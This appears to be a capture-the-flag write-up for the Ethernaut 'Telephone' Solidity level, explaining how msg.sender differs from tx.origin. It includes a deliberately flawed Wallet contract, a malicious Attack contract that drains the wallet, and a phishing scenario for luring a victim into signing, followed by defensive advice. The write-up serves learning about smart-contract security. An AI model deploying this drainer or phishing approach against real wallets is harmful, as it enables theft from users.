[Level 4. Telephone](https://ethernaut.openzeppelin.com/level/0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446)

## Concepts

1. The meaning of `msg.sender` and `tx.origin`, as well as the difference between these two global variables.

## Level Target

1. Take ownership of the contract.

## Breakdown & Analysis

1. Let's begin by identifying the lines of code that pertain to assigning the value of `owner`.

    1. The assignment in the function `changeOwner`.
   
    2. There are no other lines allowing us to change the value of `owner`. (we can’t get access to the `constructor` since it’s not included in the contract bytecode)
    
    So the only way is to crack from the function `changeOwner`.
    
2. To successfully call `changeOwner`, we’ll have to make the value of `msg.sender` and the value of `tx.origin` different.

    1. **`msg.sender` is the last caller that invokes the function, it can be an externally-owned account(EOA) or a contract account(CA).**
   
    2. **`tx.origin` represents the EOA that initiated the transaction. Since smart contracts can’t be invoked automatically, there will be an EOA that initiates the transaction, therefore the `tx.origin` value always refers to the original EOA that started the transaction.**
        
    Consider a simple example: Alice → contract A → contract B.
        
    The `msg.sender` of contract B is the address of contract A, yet, the `tx.origin` of contract B is Alice.
        
    And that is how we can make `msg.sender` and `tx.origin` different in this level.
        

## Detailed Steps

See [Attack.sol](https://github.com/timou0911/Ethernat-Solution-and-Explanation/blob/main/4.%20Telephone%20%E2%98%85%E2%98%86%E2%98%86%E2%98%86%E2%98%86/Attack.sol).

## Fhishing through `tx.origin`

Let’s say we have a contract called Wallet and Bob staked his ether inside it. Here’s the code:

```Solidity
contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(owner == tx.origin, "Not owner");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Tx failed");
    }
}
```

And the code below is a malicious contract:

```Solidity
contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet); // the target address
        owner = payable(msg.sender); // the attacker
    }

    function attack() public { // 
        wallet.transfer(owner, address(wallet).balance);
    }
}
```

Here’s one possible hacking process:

1. First of all, the attacker discovered that Bob had a keen interest in cryptocurrency investments.

2. The attacker sent a fake crypto-investing teaching website to Bob via email.

3. Since it is common to connect a wallet to such websites, Bob might be lured to purchase a lesson by signing the transaction through his wallet.

4. However, the transaction he signed didn’t buy him the online lesson; the transaction called `attack` in the malicious contract, and then `attack` called `transfer` in the Wallet contract, transferring all of Bob’s ethers to the attacker’s wallet.

5. Actually, Bob did get a lesson now.

Attackers may utilize soical engineering to incresase the success rate. Also, they can create multiple contracts to hide their real purpose.

To protect your contract, it’s not suitable to check permission through `tx.origin`. **A better practice is to use `msg.sneder`.**
